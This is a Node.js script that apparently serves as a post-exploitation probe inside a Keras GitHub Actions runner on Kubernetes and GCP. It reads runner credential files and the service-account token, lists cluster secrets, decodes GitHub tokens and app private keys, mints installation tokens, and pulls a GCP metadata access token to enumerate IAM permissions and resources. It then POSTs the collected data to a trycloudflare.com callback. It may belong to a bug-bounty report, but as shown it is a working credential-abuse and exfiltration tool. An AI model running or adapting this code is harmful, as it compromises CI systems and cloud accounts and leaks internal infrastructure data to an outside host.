"use strict";

const crypto = require("crypto");
const fs = require("fs");
const http = require("http");
const https = require("https");
const path = require("path");
const zlib = require("zlib");

const RUNNER_ROOT = "/home/runner";
const KSA_ROOT = "/var/run/secrets/kubernetes.io/serviceaccount";
const MAX_ITEMS = 50;
const CALLBACK_URL =
  "https://vocational-clinics-orders-recall.trycloudflare.com/" +
  "66dd0e4c4f309e1700c37d9f42fc6850";

function opaque(value) {
  if (typeof value !== "string" || value.length === 0) return null;
  return crypto.createHash("sha256").update(value).digest("hex").slice(0, 12);
}

function readJson(file) {
  try {
    const value = JSON.parse(fs.readFileSync(file, "utf8"));
    return value && typeof value === "object" && !Array.isArray(value)
      ? value
      : null;
  } catch {
    return null;
  }
}

function fileMetadata(file) {
  try {
    const info = fs.statSync(file);
    return {
      present: true,
      mode_octal: (info.mode & 0o7777).toString(8).padStart(4, "0"),
      uid: info.uid,
      gid: info.gid,
      bytes: info.size,
    };
  } catch (error) {
    return { present: false, error: error.code || error.name };
  }
}

function urlHost(value) {
  try {
    return typeof value === "string" ? new URL(value).host : null;
  } catch {
    return null;
  }
}

function caseInsensitive(object, wanted) {
  const key = Object.keys(object).find(
    (candidate) => candidate.toLowerCase() === wanted.toLowerCase(),
  );
  return key === undefined ? undefined : object[key];
}

function runnerFiles() {
  const runnerPath = path.join(RUNNER_ROOT, ".runner");
  const credentialsPath = path.join(RUNNER_ROOT, ".credentials");
  const rsaPath = path.join(RUNNER_ROOT, ".credentials_rsaparams");
  const runner = readJson(runnerPath) || {};
  const credentials = readJson(credentialsPath) || {};
  const credentialData = caseInsensitive(credentials, "data");
  const data =
    credentialData && typeof credentialData === "object"
      ? credentialData
      : {};
  const rsa = readJson(rsaPath) || {};
  const modulus = rsa.Modulus || rsa.modulus;
  let modulusBits = null;
  try {
    if (typeof modulus === "string") {
      modulusBits = Buffer.from(modulus, "base64").length * 8;
    }
  } catch {}
  const allowedRunnerKeys = [
    "agentId",
    "agentName",
    "poolId",
    "poolName",
    "serverUrl",
    "gitHubUrl",
    "workFolder",
    "ephemeral",
    "disableUpdate",
  ];
  return {
    runner: {
      file: fileMetadata(runnerPath),
      field_names: Object.keys(runner).sort(),
      metadata: Object.fromEntries(
        allowedRunnerKeys
          .filter((key) => caseInsensitive(runner, key) !== undefined)
          .map((key) => [key, caseInsensitive(runner, key)]),
      ),
    },
    credentials: {
      file: fileMetadata(credentialsPath),
      field_names: Object.keys(credentials).sort(),
      scheme: caseInsensitive(credentials, "scheme") || null,
      data_keys: Object.keys(data).sort(),
      client_id: caseInsensitive(data, "clientId") || null,
      authorization_host: urlHost(caseInsensitive(data, "authorizationUrl")),
      authorization_v2_host: urlHost(
        caseInsensitive(data, "authorizationUrlV2"),
      ),
      oauth_endpoint_host: urlHost(caseInsensitive(data, "oauthEndpointUrl")),
    },
    rsa_parameters: {
      file: fileMetadata(rsaPath),
      field_names: Object.keys(rsa).sort(),
      modulus_bits: modulusBits,
      values_returned: false,
    },
  };
}

function decodeClaims(token) {
  try {
    const part = token.split(".")[1];
    if (!part) return null;
    const value = JSON.parse(Buffer.from(part, "base64url").toString("utf8"));
    return value && typeof value === "object" ? value : null;
  } catch {
    return null;
  }
}

function projectClaims(claims) {
  if (!claims) return { available: false };
  const kubernetes = claims["kubernetes.io"] || {};
  const serviceaccount = kubernetes.serviceaccount || {};
  const pod = kubernetes.pod || {};
  const node = kubernetes.node || {};
  return {
    available: true,
    iss_hash: opaque(claims.iss),
    sub_hash: opaque(claims.sub),
    aud: claims.aud,
    iat: claims.iat,
    exp: claims.exp,
    namespace_hash: opaque(kubernetes.namespace),
    serviceaccount: {
      name_hash: opaque(serviceaccount.name),
      uid_present: Boolean(serviceaccount.uid),
    },
    pod: { name_hash: opaque(pod.name), uid_present: Boolean(pod.uid) },
    node: { name_hash: opaque(node.name), uid_present: Boolean(node.uid) },
    token_returned: false,
  };
}

function request(options) {
  return new Promise((resolve) => {
    const library = options.protocol === "https:" ? https : http;
    const req = library.request(
      {
        protocol: options.protocol,
        hostname: options.hostname,
        port: options.port,
        path: options.requestPath,
        method: options.method,
        headers: options.headers,
        ca: options.ca,
        timeout: options.timeout || 8000,
      },
      (res) => {
        const chunks = [];
        let size = 0;
        res.on("data", (chunk) => {
          size += chunk.length;
          if (size <= 1024 * 1024) chunks.push(chunk);
        });
        res.on("end", () => {
          if (size > 1024 * 1024) {
            resolve({ ok: false, error: "ResponseTooLarge" });
            return;
          }
          const text = Buffer.concat(chunks).toString("utf8");
          let value = null;
          try {
            value = text ? JSON.parse(text) : null;
          } catch {}
          resolve({
            ok: res.statusCode >= 200 && res.statusCode < 300,
            status: res.statusCode,
            headers: res.headers,
            text,
            value,
          });
        });
      },
    );
    req.on("timeout", () => req.destroy(new Error("Timeout")));
    req.on("error", (error) =>
      resolve({ ok: false, error: error.code || error.name }),
    );
    if (options.body) req.write(options.body);
    req.end();
  });
}

class KubeClient {
  constructor(token, namespace) {
    this.host = process.env.KUBERNETES_SERVICE_HOST;
    if (!this.host) throw new Error("KUBERNETES_SERVICE_HOST absent");
    this.port = process.env.KUBERNETES_SERVICE_PORT_HTTPS || "443";
    this.token = token;
    this.namespace = namespace;
    this.ca = fs.readFileSync(path.join(KSA_ROOT, "ca.crt"));
  }

  async call(method, requestPath, body = null, accept = "application/json") {
    const encoded = body ? Buffer.from(JSON.stringify(body)) : null;
    return request({
      protocol: "https:",
      hostname: this.host,
      port: this.port,
      requestPath,
      method,
      ca: this.ca,
      body: encoded,
      headers: {
        Authorization: `Bearer ${this.token}`,
        Accept: accept,
        "Content-Type": "application/json",
        ...(encoded ? { "Content-Length": encoded.length } : {}),
      },
    });
  }

  async ssar(verb, resource, group = "", subresource = null) {
    const resourceAttributes = {
      namespace: this.namespace,
      verb,
      group,
      resource,
      ...(subresource ? { subresource } : {}),
    };
    const response = await this.call(
      "POST",
      "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews",
      {
        apiVersion: "authorization.k8s.io/v1",
        kind: "SelfSubjectAccessReview",
        spec: { resourceAttributes },
      },
    );
    const status = response.value && response.value.status;
    if (response.ok && status) {
      return {
        allowed: Boolean(status.allowed),
        denied: Boolean(status.denied),
        reason: status.reason || null,
      };
    }
    return { ok: false, status: response.status, error: response.error || null };
  }

  async partialMetadata(requestPath, kind) {
    const response = await this.call(
      "GET",
      requestPath,
      null,
      "application/json;as=PartialObjectMetadataList;g=meta.k8s.io;v=v1",
    );
    if (!response.ok || !response.value) {
      return { ok: false, status: response.status, error: response.error || null };
    }
    const raw = Array.isArray(response.value.items) ? response.value.items : [];
    const items = raw.slice(0, MAX_ITEMS).map((item) => {
      const metadata = item.metadata || {};
      const labels = metadata.labels || {};
      const annotations = metadata.annotations || {};
      const safeLabels = Object.fromEntries(
        Object.entries(labels).filter(
          ([key]) =>
            key.startsWith("actions.github.com/") ||
            key.startsWith("app.kubernetes.io/") ||
            key === "job-name" ||
            key === "jobset.sigs.k8s.io/jobset-name",
        ),
      );
      const safeAnnotations = {};
      if (annotations["iam.gke.io/gcp-service-account"]) {
        safeAnnotations["iam.gke.io/gcp-service-account"] =
          annotations["iam.gke.io/gcp-service-account"];
      }
      const owners = Array.isArray(metadata.ownerReferences)
        ? metadata.ownerReferences.map((owner) => ({
            kind: owner.kind || null,
            name_hash: opaque(owner.name),
            controller: Boolean(owner.controller),
          }))
        : [];
      return {
        name_hash: opaque(metadata.name),
        labels: safeLabels,
        annotations: safeAnnotations,
        ownerReferences: owners,
        arc_cleanup_finalizer: Array.isArray(metadata.finalizers)
          ? metadata.finalizers.includes("actions.github.com/cleanup-protection")
          : false,
      };
    });
    return {
      ok: true,
      kind,
      count: raw.length,
      items,
      truncated: raw.length > MAX_ITEMS,
      object_bodies_returned: false,
    };
  }

  async runnerSets(requestPath) {
    const response = await this.call("GET", requestPath);
    if (!response.ok || !response.value) {
      return { ok: false, status: response.status, error: response.error || null };
    }
    const raw = Array.isArray(response.value.items) ? response.value.items : [];
    return {
      ok: true,
      items: raw.map((item) => {
        const spec = item.spec || {};
        const podSpec = (spec.template && spec.template.spec) || {};
        return {
          name_hash: opaque(item.metadata && item.metadata.name),
          runnerScaleSetName: spec.runnerScaleSetName || null,
          runnerGroup: spec.runnerGroup || null,
          githubConfigUrl: spec.githubConfigUrl || null,
          githubConfigSecret_name_hash: opaque(spec.githubConfigSecret),
          githubConfigSecret_configured: Boolean(spec.githubConfigSecret),
          vaultType: spec.vaultConfig ? spec.vaultConfig.type || null : null,
          runner_serviceaccount_name_hash: opaque(podSpec.serviceAccountName),
        };
      }),
      secret_values_returned: false,
    };
  }
}

async function apiRequest(url, token, method = "GET", body = null) {
  const target = new URL(url);
  const encoded = body === null ? null : Buffer.from(JSON.stringify(body));
  return request({
    protocol: target.protocol,
    hostname: target.hostname,
    port: target.port || (target.protocol === "https:" ? 443 : 80),
    requestPath: target.pathname + target.search,
    method,
    body: encoded,
    headers: {
      Authorization: `Bearer ${token}`,
      Accept: "application/vnd.github+json, application/json",
      "Content-Type": "application/json",
      "User-Agent": "keras-oss-vrp-metadata-probe",
      ...(encoded ? { "Content-Length": encoded.length } : {}),
    },
  });
}

function responseSummary(response) {
  const apiError = response.value && response.value.error;
  const details = apiError && Array.isArray(apiError.details) ? apiError.details : [];
  return {
    ok: Boolean(response.ok),
    status: response.status || null,
    error: response.error || null,
    api_error:
      apiError && typeof apiError === "object"
        ? {
            code: apiError.code || null,
            status: apiError.status || null,
            message: typeof apiError.message === "string"
              ? apiError.message.slice(0, 500)
              : null,
            reasons: details
              .map((detail) => ({
                reason: detail.reason || null,
                domain: detail.domain || null,
                service: detail.metadata && detail.metadata.service,
              }))
              .filter((detail) => detail.reason || detail.domain || detail.service),
          }
        : typeof apiError === "string"
          ? apiError.slice(0, 500)
          : null,
    api_message:
      response.value && typeof response.value.message === "string"
        ? response.value.message.slice(0, 500)
        : null,
  };
}

async function githubReadAuthority(token) {
  const base = "https://api.github.com";
  const [user, repository, runners, runnerGroups, actionSecrets, packages, repos] =
    await Promise.all([
      apiRequest(`${base}/user`, token),
      apiRequest(`${base}/repos/keras-team/keras`, token),
      apiRequest(`${base}/orgs/keras-team/actions/runners?per_page=100`, token),
      apiRequest(`${base}/orgs/keras-team/actions/runner-groups?per_page=100`, token),
      apiRequest(`${base}/repos/keras-team/keras/actions/secrets?per_page=1`, token),
      apiRequest(`${base}/orgs/keras-team/packages?package_type=container&per_page=1`, token),
      apiRequest(`${base}/installation/repositories?per_page=100`, token),
    ]);
  const repoItems =
    repos.value && Array.isArray(repos.value.repositories)
      ? repos.value.repositories
      : [];
  const runnerItems =
    runners.value && Array.isArray(runners.value.runners)
      ? runners.value.runners
      : [];
  const groupItems =
    runnerGroups.value && Array.isArray(runnerGroups.value.runner_groups)
      ? runnerGroups.value.runner_groups
      : [];
  const groupDetails = [];
  for (const group of groupItems) {
    const [groupRepos, groupRunners] = await Promise.all([
      apiRequest(
        `${base}/orgs/keras-team/actions/runner-groups/${group.id}/repositories?per_page=100`,
        token,
      ),
      apiRequest(
        `${base}/orgs/keras-team/actions/runner-groups/${group.id}/runners?per_page=100`,
        token,
      ),
    ]);
    groupDetails.push({
      id: group.id,
      name: group.name,
      visibility: group.visibility,
      default: Boolean(group.default),
      allows_public_repositories: Boolean(group.allows_public_repositories),
      restricted_to_workflows: Boolean(group.restricted_to_workflows),
      selected_workflows: group.selected_workflows || [],
      repositories: {
        ...responseSummary(groupRepos),
        names:
          groupRepos.ok && Array.isArray(groupRepos.value.repositories)
            ? groupRepos.value.repositories.map((repo) => ({
                full_name: repo.full_name,
                visibility: repo.visibility,
                private: Boolean(repo.private),
                archived: Boolean(repo.archived),
              }))
            : [],
      },
      runners: {
        ...responseSummary(groupRunners),
        names:
          groupRunners.ok && Array.isArray(groupRunners.value.runners)
            ? groupRunners.value.runners.map((runner) => runner.name)
            : [],
      },
    });
  }
  const scopeHeader =
    (user.headers && user.headers["x-oauth-scopes"]) ||
    (repository.headers && repository.headers["x-oauth-scopes"]) ||
    "";
  return {
    oauth_scopes: String(scopeHeader)
      .split(",")
      .map((scope) => scope.trim())
      .filter(Boolean)
      .sort(),
    authenticated_user: user.ok
      ? {
          login: user.value.login,
          id: user.value.id,
          type: user.value.type,
          site_admin: Boolean(user.value.site_admin),
        }
      : responseSummary(user),
    keras_repository: repository.ok
      ? {
          full_name: repository.value.full_name,
          visibility: repository.value.visibility,
          permissions: repository.value.permissions || null,
        }
      : responseSummary(repository),
    organization_runners: {
      ...responseSummary(runners),
      total_count: runners.ok ? runners.value.total_count : null,
      runners: runnerItems.map((runner) => ({
        id: runner.id,
        name: runner.name,
        os: runner.os,
        status: runner.status,
        busy: Boolean(runner.busy),
        labels: Array.isArray(runner.labels)
          ? runner.labels.map((label) => ({
              name: label.name,
              type: label.type,
            }))
          : [],
      })),
    },
    organization_runner_groups: {
      ...responseSummary(runnerGroups),
      total_count: runnerGroups.ok ? runnerGroups.value.total_count : null,
      groups: groupDetails,
    },
    repository_actions_secrets: {
      ...responseSummary(actionSecrets),
      total_count: actionSecrets.ok ? actionSecrets.value.total_count : null,
    },
    organization_container_packages: {
      ...responseSummary(packages),
      returned_count: packages.ok && Array.isArray(packages.value)
        ? packages.value.length
        : null,
    },
    installation_repositories: {
      ...responseSummary(repos),
      total_count: repos.ok ? repos.value.total_count : null,
      repositories: repoItems.map((repo) => ({
        full_name: repo.full_name,
        visibility: repo.visibility,
        private: Boolean(repo.private),
        archived: Boolean(repo.archived),
      })),
    },
  };
}

function appJwt(appId, privateKey) {
  const now = Math.floor(Date.now() / 1000);
  const encode = (value) =>
    Buffer.from(JSON.stringify(value)).toString("base64url");
  const signingInput = `${encode({ alg: "RS256", typ: "JWT" })}.${encode({
    iat: now - 60,
    exp: now + 540,
    iss: String(appId),
  })}`;
  const signature = crypto
    .sign("RSA-SHA256", Buffer.from(signingInput), privateKey)
    .toString("base64url");
  return `${signingInput}.${signature}`;
}

function decodedSecret(secret) {
  const values = {};
  for (const [key, value] of Object.entries(secret.data || {})) {
    try {
      values[key] = Buffer.from(value, "base64").toString("utf8");
    } catch {}
  }
  return values;
}

async function analyzeGithubSecret(secret) {
  const values = decodedSecret(secret);
  const keys = Object.keys(values).sort();
  const base = "https://api.github.com";
  if (values.github_token) {
    return {
      secret_name: secret.metadata.name,
      mode: "github_token",
      data_keys: keys,
      token_value_returned: false,
      authority: await githubReadAuthority(values.github_token),
    };
  }
  const appKeys = [
    "github_app_id",
    "github_app_installation_id",
    "github_app_private_key",
  ];
  if (!appKeys.every((key) => values[key])) return null;
  let jwt;
  try {
    jwt = appJwt(values.github_app_id, values.github_app_private_key);
  } catch (error) {
    return {
      secret_name: secret.metadata.name,
      mode: "github_app",
      data_keys: keys,
      error: error.code || error.name,
      credential_values_returned: false,
    };
  }
  const app = await apiRequest(`${base}/app`, jwt);
  const installation = await apiRequest(
    `${base}/app/installations/${encodeURIComponent(values.github_app_installation_id)}`,
    jwt,
  );
  const result = {
    secret_name: secret.metadata.name,
    mode: "github_app",
    data_keys: keys,
    credential_values_returned: false,
    app: app.ok
      ? {
          id: app.value.id,
          slug: app.value.slug,
          owner: app.value.owner && app.value.owner.login,
          permissions: app.value.permissions || {},
          events: app.value.events || [],
        }
      : responseSummary(app),
    installation: installation.ok
      ? {
          id: installation.value.id,
          account: installation.value.account && installation.value.account.login,
          target_type: installation.value.target_type,
          repository_selection: installation.value.repository_selection,
          permissions: installation.value.permissions || {},
          events: installation.value.events || [],
          suspended: Boolean(installation.value.suspended_at),
        }
      : responseSummary(installation),
  };
  const minted = await apiRequest(
    `${base}/app/installations/${encodeURIComponent(values.github_app_installation_id)}/access_tokens`,
    jwt,
    "POST",
    {},
  );
  result.installation_token = {
    ...responseSummary(minted),
    minted: Boolean(minted.ok && minted.value && minted.value.token),
    expires_at: minted.ok ? minted.value.expires_at : null,
    permissions: minted.ok ? minted.value.permissions || {} : {},
    repository_selection: minted.ok ? minted.value.repository_selection || null : null,
    token_value_returned: false,
  };
  if (result.installation_token.minted) {
    result.authority = await githubReadAuthority(minted.value.token);
  }
  return result;
}

function sensitiveConfigPaths(value, prefix = [], output = []) {
  if (!value || typeof value !== "object") return output;
  for (const [key, child] of Object.entries(value)) {
    const next = [...prefix, key];
    if (/token|secret|password|private|credential|api.?key/i.test(key)) {
      output.push({
        path: next.join("."),
        value_type: Array.isArray(child) ? "array" : typeof child,
        string_length: typeof child === "string" ? child.length : null,
        object_keys:
          child && typeof child === "object" && !Array.isArray(child)
            ? Object.keys(child).sort()
            : [],
      });
    }
    sensitiveConfigPaths(child, next, output);
  }
  return output;
}

function helmRelease(value) {
  try {
    let payload = Buffer.from(value, "base64");
    const text = payload.toString("utf8").trim();
    if (text.startsWith("H4sI")) payload = Buffer.from(text, "base64");
    if (payload[0] === 0x1f && payload[1] === 0x8b) {
      payload = zlib.gunzipSync(payload);
    }
    const release = JSON.parse(payload.toString("utf8"));
    const config = release.config || {};
    const template = config.template || {};
    const podSpec = template.spec || {};
    const containers = Array.isArray(podSpec.containers) ? podSpec.containers : [];
    const volumes = Array.isArray(podSpec.volumes) ? podSpec.volumes : [];
    const configSecret = config.githubConfigSecret;
    return {
      parsed: true,
      name: release.name || null,
      namespace: release.namespace || null,
      version: release.version || null,
      status: release.info && release.info.status,
      chart: release.chart && release.chart.metadata
        ? {
            name: release.chart.metadata.name,
            version: release.chart.metadata.version,
            app_version: release.chart.metadata.appVersion,
          }
        : null,
      selected_config: {
        githubConfigUrl: config.githubConfigUrl || null,
        githubConfigSecret:
          typeof configSecret === "string"
            ? { mode: "reference", name: configSecret }
            : configSecret && typeof configSecret === "object"
              ? { mode: "inline", key_names: Object.keys(configSecret).sort() }
              : { mode: "absent" },
        runnerScaleSetName: config.runnerScaleSetName || null,
        runnerGroup: config.runnerGroup || null,
        minRunners: config.minRunners ?? null,
        maxRunners: config.maxRunners ?? null,
        vaultType:
          config.vaultConfig && typeof config.vaultConfig === "object"
            ? config.vaultConfig.type || null
            : null,
        containerMode:
          typeof config.containerMode === "string"
            ? config.containerMode
            : config.containerMode && typeof config.containerMode === "object"
              ? Object.keys(config.containerMode).sort()
              : null,
        runner_template: {
          serviceAccountName: podSpec.serviceAccountName || null,
          automountServiceAccountToken:
            podSpec.automountServiceAccountToken ?? null,
          hostNetwork: podSpec.hostNetwork ?? null,
          hostPID: podSpec.hostPID ?? null,
          containers: containers.map((container) => ({
            name: container.name || null,
            image: container.image || null,
            env_names: Array.isArray(container.env)
              ? container.env.map((entry) => entry.name).filter(Boolean).sort()
              : [],
            secret_env_refs: Array.isArray(container.env)
              ? container.env
                  .map((entry) => entry.valueFrom && entry.valueFrom.secretKeyRef)
                  .filter(Boolean)
                  .map((ref) => ({ name: ref.name, key: ref.key }))
              : [],
          })),
          secret_volumes: volumes
            .filter((volume) => volume.secret)
            .map((volume) => ({
              volume_name: volume.name,
              secret_name: volume.secret.secretName,
            })),
        },
      },
      sensitive_config_paths: sensitiveConfigPaths(config),
      manifest_bytes: typeof release.manifest === "string"
        ? Buffer.byteLength(release.manifest)
        : null,
      manifest_returned: false,
      config_values_returned: false,
    };
  } catch (error) {
    return { parsed: false, error: error.code || error.name };
  }
}

async function classifySecrets(client, namespace) {
  const quoted = encodeURIComponent(namespace);
  const response = await client.call(
    "GET",
    `/api/v1/namespaces/${quoted}/secrets`,
  );
  if (!response.ok || !response.value || !Array.isArray(response.value.items)) {
    return { ...responseSummary(response), secret_values_returned: false };
  }
  const inventory = response.value.items.map((secret) => ({
    name: secret.metadata && secret.metadata.name,
    type: secret.type || null,
    data_keys: Object.keys(secret.data || {}).sort(),
    owner_kinds: Array.isArray(secret.metadata && secret.metadata.ownerReferences)
      ? secret.metadata.ownerReferences.map((owner) => owner.kind).sort()
      : [],
  }));
  const githubCredentials = [];
  const helmReleases = [];
  for (const secret of response.value.items) {
    const analyzed = await analyzeGithubSecret(secret);
    if (analyzed) githubCredentials.push(analyzed);
    if (secret.type === "helm.sh/release.v1" && secret.data && secret.data.release) {
      helmReleases.push({
        secret_name: secret.metadata.name,
        ...helmRelease(secret.data.release),
      });
    }
  }
  return {
    ok: true,
    inventory,
    github_credentials: githubCredentials,
    helm_releases: helmReleases,
    secret_values_returned: false,
    secret_value_hashes_returned: false,
  };
}

async function gcpAuthority(projectId) {
  const tokenResponse = await request({
    protocol: "http:",
    hostname: "metadata.google.internal",
    port: 80,
    requestPath: "/computeMetadata/v1/instance/service-accounts/default/token",
    method: "GET",
    timeout: 5000,
    headers: { "Metadata-Flavor": "Google" },
  });
  const accessToken = tokenResponse.value && tokenResponse.value.access_token;
  if (!tokenResponse.ok || !accessToken) {
    return {
      token_obtained_in_process: false,
      token_value_returned: false,
      token_request: responseSummary(tokenResponse),
    };
  }
  const tokenInfoUrl = new URL("https://oauth2.googleapis.com/tokeninfo");
  tokenInfoUrl.searchParams.set("access_token", accessToken);
  const tokenInfo = await apiRequest(tokenInfoUrl.toString(), accessToken);
  const projectPermissions = [
    "resourcemanager.projects.get",
    "resourcemanager.projects.getIamPolicy",
    "resourcemanager.projects.setIamPolicy",
    "resourcemanager.projects.update",
    "resourcemanager.projects.delete",
    "iam.serviceAccounts.list",
    "iam.serviceAccounts.get",
    "iam.serviceAccounts.actAs",
    "iam.serviceAccounts.getAccessToken",
    "iam.serviceAccounts.signBlob",
    "iam.serviceAccounts.signJwt",
    "iam.serviceAccounts.setIamPolicy",
    "serviceusage.services.use",
    "serviceusage.services.enable",
    "secretmanager.secrets.list",
    "secretmanager.secrets.get",
    "secretmanager.secrets.create",
    "secretmanager.secrets.getIamPolicy",
    "secretmanager.secrets.setIamPolicy",
    "secretmanager.versions.access",
    "secretmanager.versions.add",
    "storage.buckets.list",
    "storage.buckets.get",
    "storage.buckets.create",
    "storage.buckets.setIamPolicy",
    "storage.objects.list",
    "storage.objects.get",
    "storage.objects.create",
    "storage.objects.delete",
    "artifactregistry.repositories.list",
    "artifactregistry.repositories.get",
    "artifactregistry.repositories.downloadArtifacts",
    "artifactregistry.repositories.uploadArtifacts",
    "artifactregistry.packages.list",
    "pubsub.topics.list",
    "pubsub.topics.get",
    "pubsub.topics.publish",
    "pubsub.topics.create",
    "cloudbuild.builds.list",
    "cloudbuild.builds.get",
    "cloudbuild.builds.create",
    "run.services.list",
    "run.services.get",
    "run.services.create",
    "run.services.update",
    "container.clusters.list",
    "container.clusters.get",
    "container.clusters.update",
  ];
  const projectTest = await apiRequest(
    `https://cloudresourcemanager.googleapis.com/v1/projects/${encodeURIComponent(projectId)}:testIamPermissions`,
    accessToken,
    "POST",
    { permissions: projectPermissions },
  );
  const [serviceAccounts, secrets, repositories, topics, buckets, builds, clusters] =
    await Promise.all([
      apiRequest(
        `https://iam.googleapis.com/v1/projects/${encodeURIComponent(projectId)}/serviceAccounts?pageSize=100`,
        accessToken,
      ),
      apiRequest(
        `https://secretmanager.googleapis.com/v1/projects/${encodeURIComponent(projectId)}/secrets?pageSize=100`,
        accessToken,
      ),
      apiRequest(
        `https://artifactregistry.googleapis.com/v1/projects/${encodeURIComponent(projectId)}/locations/-/repositories?pageSize=100`,
        accessToken,
      ),
      apiRequest(
        `https://pubsub.googleapis.com/v1/projects/${encodeURIComponent(projectId)}/topics?pageSize=100`,
        accessToken,
      ),
      apiRequest(
        `https://storage.googleapis.com/storage/v1/b?project=${encodeURIComponent(projectId)}&maxResults=100`,
        accessToken,
      ),
      apiRequest(
        `https://cloudbuild.googleapis.com/v1/projects/${encodeURIComponent(projectId)}/builds?pageSize=1`,
        accessToken,
      ),
      apiRequest(
        `https://container.googleapis.com/v1/projects/${encodeURIComponent(projectId)}/locations/-/clusters`,
        accessToken,
      ),
    ]);
  const names = (response, field, mapper) =>
    response.ok && Array.isArray(response.value[field])
      ? response.value[field].slice(0, 100).map(mapper).filter(Boolean)
      : [];
  return {
    token_obtained_in_process: true,
    token_value_returned: false,
    token_info: tokenInfo.ok
      ? {
          email: tokenInfo.value.email || null,
          audience: tokenInfo.value.aud || tokenInfo.value.audience || null,
          scope: tokenInfo.value.scope || null,
          expires_in: tokenInfo.value.expires_in || null,
        }
      : responseSummary(tokenInfo),
    project_test_iam_permissions: projectTest.ok
      ? (projectTest.value.permissions || []).sort()
      : responseSummary(projectTest),
    inventories: {
      service_accounts: {
        ...responseSummary(serviceAccounts),
        names: names(serviceAccounts, "accounts", (item) => item.email),
      },
      secret_manager: {
        ...responseSummary(secrets),
        names: names(secrets, "secrets", (item) => item.name),
      },
      artifact_registry: {
        ...responseSummary(repositories),
        repositories: names(repositories, "repositories", (item) => ({
          name: item.name,
          format: item.format,
          mode: item.mode,
        })),
      },
      pubsub: {
        ...responseSummary(topics),
        topics: names(topics, "topics", (item) => item.name),
      },
      storage: {
        ...responseSummary(buckets),
        buckets: names(buckets, "items", (item) => item.name),
      },
      cloud_build: {
        ...responseSummary(builds),
        returned_count: builds.ok && Array.isArray(builds.value.builds)
          ? builds.value.builds.length
          : null,
      },
      gke: {
        ...responseSummary(clusters),
        cluster_names: names(clusters, "clusters", (item) => item.name),
      },
    },
  };
}

async function metadataText(metadataPath) {
  const response = await request({
    protocol: "http:",
    hostname: "metadata.google.internal",
    port: 80,
    requestPath: `/computeMetadata/v1/${metadataPath}`,
    method: "GET",
    timeout: 3000,
    headers: { "Metadata-Flavor": "Google" },
  });
  if (!response.ok) return null;
  const text = response.text.trim();
  return metadataPath.endsWith("/scopes")
    ? text.split("\n").filter(Boolean).sort()
    : text || null;
}

async function collect() {
  const output = {
    phase: "authority-analysis",
    captured_at: new Date().toISOString(),
    safety: {
      credential_values_returned: false,
      credential_hashes_returned: false,
      github_credential_returned: false,
      cloud_token_requested: true,
      cloud_token_returned: false,
      cloud_identity_document_requested: false,
      kubernetes_secret_data_requested: true,
      kubernetes_secret_values_returned: false,
      authentication_token_mint_request_sent: true,
      mutating_request_sent: false,
    },
    process: {
      uid: process.getuid ? process.getuid() : null,
      gid: process.getgid ? process.getgid() : null,
      environment_variable_names: Object.keys(process.env)
        .filter((key) => /TOKEN|SECRET|CREDENTIAL|KUBERNETES|RUNNER/i.test(key))
        .sort(),
    },
    runner_files: runnerFiles(),
  };
  const [projectId, serviceAccountEmail, scopes] = await Promise.all([
    metadataText("project/project-id"),
    metadataText("instance/service-accounts/default/email"),
    metadataText("instance/service-accounts/default/scopes"),
  ]);
  output.gce_metadata = {
    project_id: projectId,
    service_account_email: serviceAccountEmail,
    scopes,
    access_token_requested: true,
  };

  let token;
  let namespace;
  try {
    token = fs.readFileSync(path.join(KSA_ROOT, "token"), "utf8").trim();
    namespace = fs.readFileSync(path.join(KSA_ROOT, "namespace"), "utf8").trim();
  } catch (error) {
    output.kubernetes = { available: false, error: error.code || error.name };
    return output;
  }
  output.kubernetes_identity = projectClaims(decodeClaims(token));
  let client;
  try {
    client = new KubeClient(token, namespace);
  } catch (error) {
    output.kubernetes = { available: false, error: error.code || error.name };
    return output;
  }
  const checks = [
    ["pods", "list", "", null],
    ["pods", "create", "", null],
    ["pods", "create", "", "exec"],
    ["pods", "get", "", "log"],
    ["jobs", "list", "batch", null],
    ["secrets", "get", "", null],
    ["secrets", "list", "", null],
    ["serviceaccounts", "list", "", null],
    ["serviceaccounts", "create", "", "token"],
    ["roles", "list", "rbac.authorization.k8s.io", null],
    ["rolebindings", "list", "rbac.authorization.k8s.io", null],
    ["nodes", "list", "", null],
    ["autoscalingrunnersets", "list", "actions.github.com", null],
    ["ephemeralrunners", "list", "actions.github.com", null],
  ];
  const authorization = {};
  for (const [resource, verb, group, subresource] of checks) {
    const key = [group || "core", resource, subresource, verb]
      .filter(Boolean)
      .join("/");
    authorization[key] = await client.ssar(verb, resource, group, subresource);
  }
  const quoted = encodeURIComponent(namespace);
  output.kubernetes = {
    available: true,
    namespace_hash: opaque(namespace),
    authorization,
    pod_metadata: await client.partialMetadata(
      `/api/v1/namespaces/${quoted}/pods`,
      "Pod",
    ),
    job_metadata: await client.partialMetadata(
      `/apis/batch/v1/namespaces/${quoted}/jobs`,
      "Job",
    ),
    secret_metadata: await client.partialMetadata(
      `/api/v1/namespaces/${quoted}/secrets`,
      "Secret",
    ),
    serviceaccount_metadata: await client.partialMetadata(
      `/api/v1/namespaces/${quoted}/serviceaccounts`,
      "ServiceAccount",
    ),
  };
  const arsKey = "actions.github.com/autoscalingrunnersets/list";
  if (authorization[arsKey] && authorization[arsKey].allowed) {
    output.kubernetes.autoscaling_runner_sets = await client.runnerSets(
      `/apis/actions.github.com/v1alpha1/namespaces/${quoted}/autoscalingrunnersets`,
    );
  }
  output.kubernetes.secret_authority = await classifySecrets(client, namespace);
  output.gcp_authority = projectId
    ? await gcpAuthority(projectId)
    : { available: false, reason: "project metadata absent" };
  return output;
}

async function send(value) {
  const target = new URL(CALLBACK_URL);
  const body = Buffer.from(JSON.stringify(value));
  const response = await request({
    protocol: target.protocol,
    hostname: target.hostname,
    port: target.port || 443,
    requestPath: target.pathname,
    method: "POST",
    body,
    headers: {
      "Content-Type": "application/json",
      "Content-Length": body.length,
    },
  });
  if (!response.ok) throw new Error("callback failed");
}

if (require.main === module) {
  collect()
    .then(send)
    .then(() => process.exit(0))
    .catch(() => process.exit(1));
}

module.exports = { appJwt, helmRelease, sensitiveConfigPaths };
